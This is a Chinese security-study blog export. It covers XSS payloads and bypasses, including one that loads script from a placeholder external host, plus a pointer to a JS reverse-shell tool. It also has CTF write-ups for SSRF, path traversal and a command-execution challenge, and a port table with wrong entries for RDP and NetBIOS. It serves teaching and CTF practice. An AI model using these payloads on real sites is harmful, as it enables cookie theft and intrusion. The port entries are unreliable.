alt="image-20231203204249856"></p><p><strong>存储型XSS：</strong>存储型XSS，持久化，代码是存储在服务器中的，如在<strong>个人信息</strong>或<strong>发表文章</strong>等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</p><p><strong>疑惑：</strong>、</p><p>保存到服务器的数据库为什么会被执行？</p><blockquote><p>可以使用评论作为例子，当你使用XSS上传了一段恶意代码之后，这个评论不仅是你可以看到，而是所有的人都可以看到，也就是说前端加载这段代码，才会显示处理。只不过正常的评论是一段字符串，这个是恶意代码而已</p></blockquote><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><p><strong>DOM型XSS：</strong>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p><p>部分可以触发DOM的JS属性</p><blockquote><p>document.referer   用于记录跳转过来的url<br>window.name         用于记录设置窗口的值，用于页面之间传送时数据，特别是在使用 iframe 或弹出窗口，可以在不同页面之间传递信息或状态<br>location                 是一个对象，代表了当前窗口的url信息。还包含了主机，路径，查询参数等信息<br>innerHTML<br>documen.write       是一个方法，用于动态的向文档中插入内容</p></blockquote><h1 id="XSS攻击的payload"><a href="#XSS攻击的payload" class="headerlink" title="XSS攻击的payload"></a>XSS攻击的payload</h1><h2 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>      #弹出cookie<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #引用外部的xss<br></code></pre></td></tr></table></figure><h2 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h2><p>这个标签可以理解为优化的图片的标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- &lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;!-- &lt;svg onload=&quot;alert(1)&quot;// </span><br></code></pre></td></tr></table></figure><h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">onerror  这个是错误处理，可以理解为当程序有问题的时候会触发这个，然后执行里的函数<br>事件在加载外部文件（文档或图像）发生错误时触发。<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">hack</span>&quot;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span>  #弹出cookie<br></code></pre></td></tr></table></figure><h2 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnpageshοw</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">οnlοadstart</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="style标签"><a href="#style标签" class="headerlink" title="style标签"></a>style标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="弹窗函数"><a href="#弹窗函数" class="headerlink" title="弹窗函数"></a>弹窗函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">alert</span>()<br><span class="hljs-title function_">confirm</span>()<br><span class="hljs-title function_">prompt</span>()<br></code></pre></td></tr></table></figure><h1 id="XSS插入位置"><a href="#XSS插入位置" class="headerlink" title="XSS插入位置"></a>XSS插入位置</h1><ul><li>用户输入作为<strong>script</strong>标签内容</li><li>用户输入作为HTML<strong>注释内容</strong></li><li>用户输入作为HTML标签的<strong>属性名</strong></li><li>用户输入作为HTML标签的<strong>属性值</strong></li><li>用户输入作为HTML标签的<strong>名字</strong></li><li>直接插入到<strong>CSS</strong>里</li><li>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 用户输入注释的时候，我们可以使用闭合执行我们的代码 --&gt;</span><br><span class="hljs-comment">&lt;!-- 用户输入 --&gt;</span><br><span class="hljs-comment">&lt;!-- --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-comment">&lt;!-- --&gt;</span><br><br><span class="hljs-comment">&lt;!-- 用户输入作为标签属性名，导致攻击者可以进行闭合绕过--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">用户输入</span>=<span class="hljs-string">&quot;xx&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">a</span>=<span class="hljs-string">&quot;xx&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 用户输入作为标签属性值，导致攻击者可以进行闭合绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;用户输入&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">a</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 用户输入作为标签名，导致攻击者可以进行闭合绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">用户输入</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xx&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xx&quot;</span> /&gt;</span><br><br><span class="hljs-comment">&lt;!-- 用户输入作为CSS内容，导致攻击者可以进行闭合绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml">用户输入<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span> </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="XSS漏洞挖掘"><a href="#XSS漏洞挖掘" class="headerlink" title="XSS漏洞挖掘"></a>XSS漏洞挖掘</h1><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p><ul><li>URL的每一个参数</li><li>URL本身</li><li>表单</li></ul><h2 id="常见业务场景"><a href="#常见业务场景" class="headerlink" title="常见业务场景"></a>常见业务场景</h2><ul><li>重灾区：评论区、留言区、个人信息、订单信息等</li><li>针对型：站内信、网页即时通讯、私信、意见反馈</li><li>存在风险：搜索框、当前目录、图片属性等</li></ul><h2 id="白盒测试-代码审计"><a href="#白盒测试-代码审计" class="headerlink" title="白盒测试(代码审计)"></a>白盒测试(代码审计)</h2><p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p><p>看PHP接受参数的方式<code>\$_GET</code>、<code>\$_POST</code>、<code>$_REQUEST</code>，查看每一个接受参数的地方有没有直接输出道页面的，输出到页面中的数据时候进行了过滤和HTML编码的问题</p><p>然后就是需要搜素<code>echo</code>这样的输出语句，跟踪文件从哪里来的，我们能不能控制</p><p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过</p><h1 id="XSS简单绕过"><a href="#XSS简单绕过" class="headerlink" title="XSS简单绕过"></a>XSS简单绕过</h1><h2 id="使用大小写绕过"><a href="#使用大小写绕过" class="headerlink" title="使用大小写绕过"></a>使用大小写绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">scripT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">scripT</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="不区分大小写，过滤之间的所有内容"><a href="#不区分大小写，过滤之间的所有内容" class="headerlink" title="不区分大小写，过滤之间的所有内容"></a>不区分大小写，过滤之间的所有内容</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">hack</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure><h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><p>总体的思路是</p><p>对输入进行url过滤，对输出进行html编码[^html编码]</p><p>这样即使用户输入了脚本，但是并不能运行 </p><p><strong>具体的做法是：</strong></p><ul><li><p>黑名单过滤和白名单过滤</p><blockquote><p>名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</p></blockquote></li><li><p>将输出html编码</p><blockquote><p>#使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体<br>$name &#x3D; htmlspecialchars( $_GET[ ‘name’ ] );</p></blockquote></li><li><p>服务端设置Cookie的http only属性，这样一来js脚本就不能直接获取Cookie信息了</p></li></ul><h1 id="使用JS反向shell"><a href="#使用JS反向shell" class="headerlink" title="使用JS反向shell"></a>使用JS反向shell</h1><blockquote><p>git clone <a href="https://github.com/shelld3v/JSshell.git">https://github.com/shelld3v/JSshell.git</a></p></blockquote><h1 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h1><p>注意如果是挖掘src的话，不要使用弹窗！！</p><p>可以使用下面的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个需要在F12，开启调试之后才能发现，可以理解为调试的结果，日志输出</p><p>[^html编码]: HTML编码是一种将特殊字符转换为HTML实体的过程。在HTML中，有一些特殊字符具有特殊的含义，比如小于号（&lt;）、大于号（&gt;）、引号（”）、和符号（&amp;）等。如果直接在HTML中使用这些字符，有时会导致解析错误或显示不正常。因此，需要使用HTML编码将这些特殊字符转换为对应的实体或代码。将小于号（&lt;）编码为 <code>&amp;lt</code>，将大于号（&gt;）编码为 <code>&amp;gt</code>，将引号（”）编码为 <code>&amp;quot</code>，将和符号（&amp;）编码为 <code>&amp;amp</code> 等。</p>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web随记</title>
    <link href="/2023/12/01/web/web%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/12/01/web/web%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="常见的默认端口"><a href="#常见的默认端口" class="headerlink" title="常见的默认端口"></a>常见的默认端口</h1><table><thead><tr><th>协议</th><th>端口</th></tr></thead><tbody><tr><td>http</td><td>80</td></tr><tr><td>https</td><td>443</td></tr><tr><td>mysql</td><td>3306</td></tr><tr><td>微软远程桌面</td><td>135</td></tr><tr><td>redis</td><td>6379</td></tr><tr><td>http代理服务</td><td>8080</td></tr><tr><td>NetBIOS</td><td>145</td></tr><tr><td>文件共享</td><td>445</td></tr></tbody></table><h1 id="Cookie，session和token"><a href="#Cookie，session和token" class="headerlink" title="Cookie，session和token"></a>Cookie，session和token</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>由于http一次性的，为了达到持续存储的想法，浏览器就会存储我们的cookie，但是简单理解为cookie是一个载体</p><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>诞生于服务器，利用cookie传送，session最重要的是sessionid，可以直接为用户的密码和账号的存储时间，当sessionid&#x3D;0的时候就需要重新输入密码和账号了。保存于服务器</p><h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><p>创建于服务器了了，保存于客户端，为了防止大量用户将sessionid保存到服务器而使用的</p><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>ping使用的协议是ICMP</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DNS重绑定攻击</title>
    <link href="/2023/12/01/web/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB/"/>
    <url>/2023/12/01/web/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web刷题</title>
    <link href="/2023/11/30/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/web%E5%88%B7%E9%A2%98/"/>
    <url>/2023/11/30/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/web%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p><strong>0x01</strong></p><p>这道题的思路比较简单</p><p>就是使用ssrf访问文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093853864.png" alt="image-20231130093853864"></p><p>给了一个接口，那么就直接访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093925060.png" alt="image-20231130093925060"></p><p>跟着他走</p><blockquote><p>file:&#x2F;&#x2F;&#x2F;&#x2F;fl4g</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094012524.png" alt="image-20231130094012524"></p><p>访问它指定的路径</p><p>出现了</p><blockquote><p>file_get_contents</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094113614.png" alt="image-20231130094113614"></p><p><strong>0x02</strong></p><p>通过这个函数，我们可以直接访问文件</p><p>他又说了文件在<code>flag</code>，所以就直接访问flag</p><p>建议直接尝试比较长的路径</p><blockquote><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094245225.png" alt="image-20231130094245225"></p><h2 id="HNCTF-2022-WEEK2-ez-ssrf已解决"><a href="#HNCTF-2022-WEEK2-ez-ssrf已解决" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf已解决"></a>[HNCTF 2022 WEEK2]ez_ssrf已解决</h2><p>[<a href="https://www.nssctf.cn/problem/2949">HNCTF 2022 WEEK2]ez_ssrf | NSSCTF</a></p><p><strong>0x00</strong></p><p>访问他给的地址，然后发现这个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130095243554.png" alt="image-20231130095243554"></p><p>出现了</p><blockquote><p> fsockopen()</p></blockquote><p>那就构造数据发送</p><p><strong>0x01</strong></p><blockquote><p>&#x2F;index.php?host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo&#x3D;</p></blockquote><p>data</p><blockquote><p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1<br>Connection: Close</p></blockquote><p>得到flag</p><p>这里就相当于是伪造了一个请求，请求了服务端，但是这个host和port不是很理解</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130095633444.png" alt="image-20231130095633444"></p><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>这道题需要代码审计</p><p>访问，出现了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>       <span class="hljs-variable">$http_x_headers</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>       <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>   &#125;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<span class="hljs-comment">// 以上的只是为了告诉我们ip地址，也就是下面加密需要用到的东西</span><br><br>   <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<span class="hljs-comment">//这个是加密路径，相当于url文件访问路径，有了上面的ip就可以计算出这个值</span><br>   @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//创建目录</span><br>   @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//将当前php的目录改为这个</span><br><br>   <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;GET &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>   <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>   <span class="hljs-variable">$dir</span>  = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<br>   @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>   @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$dir</span>);<br>   @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>   <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p><strong>0x00</strong></p><p>首先先md5找到对应的路径</p><blockquote><p>786c0b7e11c1e9322763fcc8090ef181</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160232238.png" alt="image-20231130160232238"></p><p><strong>0x01</strong></p><p>创建一个目录</p><blockquote><p>?url&#x3D;&#x2F;&amp;filename&#x3D;temp</p></blockquote><p>访问</p><blockquote><p><a href="http://d9768014-7cfd-42d6-841e-07f9b9e5dc90.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/temp">http://d9768014-7cfd-42d6-841e-07f9b9e5dc90.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/temp</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160609970.png" alt="image-20231130160609970"></p><p>出现了一些路径</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160640457.png" alt="image-20231130160640457"></p><p>有一个readfalg，这个是一个程序，所以我们想办法运行，并且将将运行的数据存放到我们的文件里面</p><p>使用bash -c &#x2F;readflag是使用bash运行程序</p><blockquote><p>&#x2F;?url&#x3D;file:bash -c &#x2F;readflag&amp; filename&#x3D;bash -c &#x2F;readflag</p><p>&#x2F;?url&#x3D;bash -c &#x2F;readflag &amp; filename&#x3D;123</p></blockquote><p>然后访问123</p><blockquote><p><a href="http://1e99b289-a06d-43fe-aa18-d5367c10e0d9.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/123">http://1e99b289-a06d-43fe-aa18-d5367c10e0d9.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/123</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130165650011.png" alt="image-20231130165650011"></p><h1 id="upload-file"><a href="#upload-file" class="headerlink" title="upload file"></a>upload file</h1><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><strong>0x00 考点</strong></p><ol><li>后缀绕过</li><li>Content-Type</li><li><code>&lt;?</code>绕过</li></ol><p><strong>0x01</strong></p><p>我先尝试直接上传php文件之后</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201151743522.png" alt="image-20231201151743522"></p><p><strong>0x02</strong></p><p>修改Content-Type</p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201151831483.png" alt="image-20231201151831483"></p><p>说明已经通过了一个测试点了</p><p>但是这里他说我们上传的是php，说明他检测到了我们的后缀</p><p><strong>0x04</strong></p><p>尝试修改文件名，修改了很多都不行</p><p>我看了其他师傅的wp发现这个地方需要上传<code>phtml</code></p><p><img 